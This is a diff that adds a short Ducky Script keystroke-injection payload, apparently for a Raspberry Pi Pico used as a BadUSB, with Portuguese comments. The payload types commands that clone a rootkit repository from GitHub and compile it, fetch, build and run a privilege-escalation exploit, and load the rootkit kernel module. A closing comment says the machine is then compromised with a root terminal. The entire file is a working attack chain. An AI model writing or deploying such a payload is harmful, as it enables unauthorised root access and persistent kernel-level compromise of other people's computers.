@@ -1,0 +1,10 @@
+REM esse delay so é necessario para dar tempo de passar a Pico pra maquina virtual
+DELAY 10000
+WINDOWS Q
+DELAY 1500
+STRING git clone https://github.com/vrennen/rootkit.git && cd rootkit && make && cd .. && git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
+ENTER
+DELAY 12000
+STRING cd ../rootkit && insmod rootkit.ko
+ENTER
+REM a partir daqui, o driver ja ta instalado, o terminal rodando como root e a maquina comprometida
